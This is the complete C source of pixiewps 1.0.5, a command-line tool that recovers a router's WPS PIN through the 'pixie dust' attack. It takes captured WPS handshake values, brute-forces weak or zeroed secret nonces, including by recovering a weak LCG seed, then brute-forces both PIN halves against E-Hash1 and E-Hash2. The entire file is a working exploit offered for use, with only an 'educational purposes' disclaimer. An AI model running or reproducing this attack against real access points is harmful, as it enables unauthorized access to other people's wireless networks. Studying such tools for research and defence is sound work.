/*
 * pixiewps: bruteforce the wps pin exploiting the low or non-existing entropy of some APs (pixie dust attack).
 *           All credits for the research go to Dominique Bongard.
 *
 * Special thanks to: datahead, soxrok2212
 *
 * Copyright (c) 2015, wiire <wi7ire@gmail.com>
 * Version: 1.0.5
 *
 * DISCLAIMER: This tool was made for educational purposes only.
 *             The author is NOT responsible for any misuse or abuse.
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program. If not, see <http://www.gnu.org/licenses/>.
 *
 * In addition, as a special exception, the copyright holders give
 * permission to link the code of portions of this program with the
 * OpenSSL library under certain conditions as described in each
 * individual source file, and distribute linked combinations
 * including the two.
 * You must obey the GNU General Public License in all respects
 * for all of the code used other than OpenSSL.  If you modify
 * file(s) with this exception, you may extend this exception to your
 * version of the file(s), but you are not obligated to do so.  If you
 * do not wish to do so, delete this exception statement from your
 * version.  If you delete this exception statement from all source
 * files in the program, then also delete it here.
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <getopt.h>
#include <string.h>

#include <openssl/hmac.h>
#include <sys/time.h>

/* WPS constants */
#define PK_LEN      192
#define AUTHKEY_LEN  32
#define HASH_LEN     32
#define NONCE_LEN    16
#define ES_LEN       16
#define PSK_LEN      16

/* LCG constants */
#define LCG_MULTIPLIER 1103515245
#define LCG_INCREMENT       12345
#define LCG_OPT_MASK   0x01ffffff

/* Exit costants */
#define MEM_ERROR 2
#define ARG_ERROR 3

typedef enum {false = 0, true = 1} bool;

int hex_string_to_byte_array(unsigned char *src, unsigned char *dst, int dst_len);
void uint_to_char_array(unsigned int num, int len, unsigned char *dst);
unsigned int wps_pin_checksum(unsigned int pin);
unsigned int wps_pin_valid(unsigned int pin);
void hmac_sha256(const void *key, int key_len, const unsigned char *data, size_t data_len, unsigned char *digest);
int rand_r(unsigned int *seed);
void byte_array_print(unsigned char *buffer, unsigned int length);
void display_usage();

static const long hextable[] = {
	[0 ... 255] = -1,
	['0'] = 0, 1, 2, 3, 4, 5, 6, 7, 8, 9,
	['A'] = 10, 11, 12, 13, 14, 15,
	['a'] = 10, 11, 12, 13, 14, 15
};

struct globalArgs_t {
	unsigned char *pke;
	unsigned char *pkr;
	unsigned char *e_hash1;
	unsigned char *e_hash2;
	unsigned char *authkey;
	unsigned char *e_nonce;
	bool small_dh_keys;
} globalArgs;

static const char *option_string = "e:r:s:z:a:n:Sh?";

static const struct option long_options[] = {
	{ "pke",        required_argument, 0, 'e' },
	{ "pkr",        required_argument, 0, 'r' },
	{ "e-hash1",    required_argument, 0, 's' },
	{ "e-hash2",    required_argument, 0, 'z' },
	{ "authkey",    required_argument, 0, 'a' },
	{ "e-nonce",    required_argument, 0, 'n' },
	{ "dh-small",   no_argument,       0, 'S' },
	{ "help",       no_argument,       0, 'h' },
	{ 0, 0, 0, 0 }
};

int main(int argc, char **argv) {
	globalArgs.pke = 0;
	globalArgs.pkr = 0;
	globalArgs.e_hash1 = 0;
	globalArgs.e_hash2 = 0;
	globalArgs.authkey = 0;
	globalArgs.e_nonce = 0;
	globalArgs.small_dh_keys = false;

	unsigned char *pke;
	unsigned char *pkr;
	unsigned char *e_hash1;
	unsigned char *e_hash2;
	unsigned char *authkey;
	unsigned char *e_nonce = 0;

	int opt = 0;
	int long_index = 0;
	opt = getopt_long(argc, argv, option_string, long_options, &long_index);

	while (opt != -1) {
		switch (opt) {
			case 'e':
				globalArgs.pke = (unsigned char *) optarg;
				break;
			case 'r':
				globalArgs.pkr = (unsigned char *) optarg;
				break;
			case 's':
				globalArgs.e_hash1 = (unsigned char *) optarg;
				break;
			case 'z':
				globalArgs.e_hash2 = (unsigned char *) optarg;
				break;
			case 'a':
				globalArgs.authkey = (unsigned char *) optarg;
				break;
			case 'n':
				globalArgs.e_nonce = (unsigned char *) optarg;
				break;
			case 'S':
				globalArgs.small_dh_keys = true;
				break;
			case 'h':
			case '?':
				display_usage();
			default:
				exit(ARG_ERROR);
		}
		opt = getopt_long(argc, argv, option_string, long_options, &long_index);
	}

	/* Not all required arguments have been supplied */
	if (globalArgs.pke == 0 || globalArgs.e_hash1 == 0 || globalArgs.e_hash2 == 0 || globalArgs.authkey == 0) {
		display_usage();
	}

	/* If --dh-small is selected then no PKR should be supplied */
	if ((globalArgs.pkr && globalArgs.small_dh_keys) || (!globalArgs.pkr && !globalArgs.small_dh_keys)) {
		display_usage();
	}

	/* Allocating memory */
	pke = (unsigned char *) malloc(PK_LEN);          if (!pke)     exit(MEM_ERROR);
	pkr = (unsigned char *) malloc(PK_LEN);          if (!pkr)     exit(MEM_ERROR);
	e_hash1 = (unsigned char *) malloc(HASH_LEN);    if (!e_hash1) exit(MEM_ERROR);
	e_hash2 = (unsigned char *) malloc(HASH_LEN);    if (!e_hash2) exit(MEM_ERROR);
	authkey = (unsigned char *) malloc(AUTHKEY_LEN); if (!authkey) exit(MEM_ERROR);

	if (globalArgs.e_nonce) {
		e_nonce = (unsigned char *) malloc(NONCE_LEN); if (!e_nonce) exit(MEM_ERROR);
		if (hex_string_to_byte_array(globalArgs.e_nonce, e_nonce, NONCE_LEN)) goto end;
	}

	if (globalArgs.small_dh_keys) {
		memset(pkr, 0, PK_LEN - 1);
		pkr[PK_LEN - 1] = 0x02;
	} else {
		if (hex_string_to_byte_array(globalArgs.pkr, pkr, PK_LEN)) goto end;
	}

	/* Converting data fed to the program to byte array */
	if (hex_string_to_byte_array(globalArgs.pke, pke, PK_LEN))              goto end;
	if (hex_string_to_byte_array(globalArgs.e_hash1, e_hash1, HASH_LEN))    goto end;
	if (hex_string_to_byte_array(globalArgs.e_hash2, e_hash2, HASH_LEN))    goto end;
	if (hex_string_to_byte_array(globalArgs.authkey, authkey, AUTHKEY_LEN)) goto end;

	/* Allocating memory for digests */
	unsigned char *psk1 = (unsigned char *) malloc(HASH_LEN);                        if (!psk1)   exit(MEM_ERROR);
	unsigned char *psk2 = (unsigned char *) malloc(HASH_LEN);                        if (!psk2)   exit(MEM_ERROR);
	unsigned char *result = (unsigned char *) malloc(HASH_LEN);                      if (!result) exit(MEM_ERROR);
	unsigned char *buffer = (unsigned char *) malloc(ES_LEN + PSK_LEN + PK_LEN * 2); if (!buffer) exit(MEM_ERROR);

	/* ES-1 = ES-2 = 0 */
	unsigned char *e_s1 = (unsigned char *) calloc(ES_LEN, 1);  if (!e_s1) exit(MEM_ERROR);
	unsigned char *e_s2 = (unsigned char *) calloc(ES_LEN, 1);  if (!e_s2) exit(MEM_ERROR);

	unsigned int seed;
	unsigned int print_seed = 0; /* Seed to display at the end */
	unsigned int first_half;
	unsigned int second_half;
	unsigned char s_pin[4] = {0};

	int mode = 1; bool found = false;
	struct timeval t0;
	struct timeval t1;

	gettimeofday(&t0, 0);

	while (mode < 4 && !found) {

		first_half = 0;
		second_half = 0;

		if (mode == 2 && e_nonce) {
			memcpy(e_s1, e_nonce, NONCE_LEN);
			memcpy(e_s2, e_nonce, NONCE_LEN);
		}

		/* PRNG bruteforce */
		if (mode == 3 && e_nonce) {

			/* Reducing entropy from 32 to 25 bits */
			unsigned int index = e_nonce[0] << 25;
			unsigned int limit = index | LCG_OPT_MASK;

			while (1) {
				seed = index;

				int i;
				for (i = 1; i < NONCE_LEN; i++) {
					if (e_nonce[i] != (unsigned char) rand_r(&seed)) break;
				}

				if (i == NONCE_LEN) { /* Seed found */
					print_seed = seed;

					/* Advance to get ES-1 */
					for (i = 0; i < NONCE_LEN; i++)
						e_s1[i] = (unsigned char) rand_r(&seed);

					/* Advance to get ES-2 */
					for (i = 0; i < NONCE_LEN; i++)
						e_s2[i] = (unsigned char) rand_r(&seed);

					break;
				}

				if (index == limit) break; /* Complete bruteforce exausted */

				index++;
			}
		}

		/* WPS pin cracking */
		if (mode == 1 || (mode == 2 && e_nonce) || (mode == 3 && print_seed)) {
			while (first_half < 10000) {
				uint_to_char_array(first_half, 4, s_pin);
				hmac_sha256(authkey, AUTHKEY_LEN, (unsigned char *) s_pin, 4, psk1);
				memcpy(buffer, e_s1, ES_LEN);
				memcpy(buffer + ES_LEN, psk1, PSK_LEN);
				memcpy(buffer + ES_LEN + PSK_LEN, pke, PK_LEN);
				memcpy(buffer + ES_LEN + PSK_LEN + PK_LEN, pkr, PK_LEN);
				hmac_sha256(authkey, AUTHKEY_LEN, buffer, ES_LEN + PSK_LEN + PK_LEN * 2, result);

				if (memcmp(result, e_hash1, HASH_LEN)) {
					first_half++;
				} else {
					break;
				}
			}

			if (first_half < 10000) { /* First half found */
				unsigned char checksum_digit;
				unsigned int c_second_half;

				/* Testing with checksum digit */
				while (second_half < 1000) {
					checksum_digit = wps_pin_checksum(first_half * 1000 + second_half);
					c_second_half = second_half * 10 + checksum_digit;
					uint_to_char_array(c_second_half, 4, s_pin);
					hmac_sha256(authkey, AUTHKEY_LEN, (unsigned char *) s_pin, 4, psk2);
					memcpy(buffer, e_s2, ES_LEN);
					memcpy(buffer + ES_LEN, psk2, PSK_LEN);
					memcpy(buffer + ES_LEN + PSK_LEN, pke, PK_LEN);
					memcpy(buffer + ES_LEN + PSK_LEN + PK_LEN, pkr, PK_LEN);
					hmac_sha256(authkey, AUTHKEY_LEN, buffer, ES_LEN + PSK_LEN + PK_LEN * 2, result);

					if (memcmp(result, e_hash2, HASH_LEN)) {
						second_half++;
					} else {
						second_half = c_second_half;
						found = true;
						break;
					}
				}

				/* Testing without checksum digit */
				if (!found) {
					second_half = 0;

					while (second_half < 10000) {

						/* If already tested skip */
						if (wps_pin_valid(first_half * 10000 + second_half)) {
							second_half++;
							continue;
						}

						uint_to_char_array(second_half, 4, s_pin);
						hmac_sha256(authkey, AUTHKEY_LEN, (unsigned char *) s_pin, 4, psk2);
						memcpy(buffer, e_s2, ES_LEN);
						memcpy(buffer + ES_LEN, psk2, PSK_LEN);
						memcpy(buffer + ES_LEN + PSK_LEN, pke, PK_LEN);
						memcpy(buffer + ES_LEN + PSK_LEN + PK_LEN, pkr, PK_LEN);
						hmac_sha256(authkey, AUTHKEY_LEN, buffer, ES_LEN + PSK_LEN + PK_LEN * 2, result);

						if (memcmp(result, e_hash2, HASH_LEN)) {
							second_half++;
						} else {
							found = true;
							break;
						}
					}
				}
			}
		}

		mode++;
	}

	gettimeofday(&t1, 0);
	long elapsed = t1.tv_sec - t0.tv_sec;
	mode--;

	if (found) {
		if (e_nonce && mode == 3) {
			printf("\n [*] PRNG Seed: %u", print_seed);
		}
		printf("\n [*] ES-1: ");
		byte_array_print(e_s1, ES_LEN);
		printf("\n [*] ES-2: ");
		byte_array_print(e_s2, ES_LEN);
		printf("\n [*] PSK1: ");
		byte_array_print(psk1, PSK_LEN);
		printf("\n [*] PSK2: ");
		byte_array_print(psk2, PSK_LEN);
		printf("\n [+] WPS pin: %04u%04u", first_half, second_half);
	} else {
		printf("\n [-] WPS pin not found!");
	}
	printf("\n\n [*] Time taken: %lu s\n\n", elapsed);

end:
	free(pke);
	free(pkr);
	free(e_hash1);
	free(e_hash2);
	free(authkey);
	free(psk1);
	free(psk2);
	free(result);
	free(buffer);
	free(e_s1);
	free(e_s2);
	if (e_nonce) free(e_nonce);

	return (!found); /* 0 success, 1 failure */
}

/* Converts an hex string to a byte array */
int hex_string_to_byte_array(unsigned char *src, unsigned char *dst, int dst_len) {
	int i = 0;
	unsigned char hvalue, lvalue;

	while (i < dst_len) {
		while (*src == ':' || *src == '-' || *src == ' ') src++; /* Keeps going until finds a good character */

		hvalue = hextable[*src];
		lvalue = hextable[*++src];

		if (hvalue == -1 || lvalue == -1) return -1;

		dst[i] = (hvalue << 4) | lvalue;
		src++;
		i++;
	}
	return 0;
}

/* Converts an unsigned integer to a char array without termination */
void uint_to_char_array(unsigned int num, int len, unsigned char *dst) {
	unsigned int mul = 1;
	while (len--) {
		dst[len] = (num % (mul * 10) / mul) + '0';
		mul *= 10;
	}
}

/* Pin checksum computing */
unsigned int wps_pin_checksum(unsigned int pin) {
	unsigned int acc = 0;
	while (pin) {
		acc += 3 * (pin % 10);
		pin /= 10;
		acc += pin % 10;
		pin /= 10;
	}
	return (10 - acc % 10) % 10;
}

/* Validity PIN control based on checksum */
unsigned int wps_pin_valid(unsigned int pin) {
	return wps_pin_checksum(pin / 10) == (pin % 10);
}

/* HMAC-SHA-256 */
void hmac_sha256(const void *key, int key_len, const unsigned char *data, size_t data_len, unsigned char *digest) {
	unsigned int h_len = HASH_LEN;
	HMAC_CTX ctx;
	HMAC_CTX_init(&ctx);
	HMAC_Init_ex(&ctx, key, key_len, EVP_sha256(), 0);
	HMAC_Update(&ctx, data, data_len);
	HMAC_Final(&ctx, digest, &h_len);
	HMAC_CTX_cleanup(&ctx);
}

/* Linear congruential generator */
int rand_r(unsigned int *seed) {
	unsigned int s = *seed;
	unsigned int uret;

	s = (s * LCG_MULTIPLIER) + LCG_INCREMENT; /* Permutate seed */
	uret = s & 0xffe00000;                    /* Use top 11 bits */
	s = (s * LCG_MULTIPLIER) + LCG_INCREMENT; /* Permutate seed */
	uret += (s & 0xfffc0000) >> 11;           /* Use top 14 bits */
	s = (s * LCG_MULTIPLIER) + LCG_INCREMENT; /* Permutate seed */
	uret += (s & 0xfe000000) >> (11 + 14);    /* Use top 7 bits */

	*seed = s;
	return (int) (uret & RAND_MAX);
}

/* Prints a byte array in hexadecimal */
void byte_array_print(unsigned char *buffer, unsigned int length) {
	unsigned int i;
	for (i = 0; i < length; i++) {
		printf("%02x", buffer[i]);
		if (i != length - 1) printf(":");
	}
}

/* Info usage */
void display_usage() {
	puts("");
	puts(" Pixiewps made by wiire");
	puts("");
	puts(" Usage: pixiewps <arguments>");
	puts("");
	puts(" Required Arguments:");
	puts("");
	puts("    -e, --pke      : Enrollee public key");
	puts("    -r, --pkr      : Registrar public key");
	puts("    -s, --e-hash1  : E-Hash1");
	puts("    -z, --e-hash2  : E-Hash2");
	puts("    -a, --authkey  : Key used in HMAC SHA-256");
	puts("");
	puts(" Optional Arguments:");
	puts("");
	puts("    -n, --e-nonce  : Enrollee nonce");
	puts("    -S, --dh-small : Small Diffie-Hellman keys (--pkr not needed)");
	puts("");
	puts("    -h, --help     : Display this usage screen");
	puts("");

	exit(ARG_ERROR);
}
